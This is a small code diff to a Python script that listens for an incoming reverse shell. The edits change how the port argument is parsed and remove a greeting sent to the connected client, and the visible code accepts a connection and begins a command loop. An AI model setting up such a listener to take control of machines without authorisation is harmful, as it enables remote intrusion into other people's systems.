@@ -2,7 +2,7 @@ import socket
 import argparse
 
 parser = argparse.ArgumentParser(prog="server_side.py", description="listen for an upcoming reverse shell")
-parser.add_argument("-p", "--port", choices=range(1024, 65535), default=1234, required=False)
+parser.add_argument("-p", "--port", type=int, default=1234, required=False)
 args = parser.parse_args()
 
 SERVER_HOST = "0.0.0.0" #all IPv4 addresses
@@ -20,7 +20,6 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 #accept a connection and return a new socket to send and receive data + address
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
-client_socket.send("Greetings !".encode())
 
 while True:
     #get the command prompt
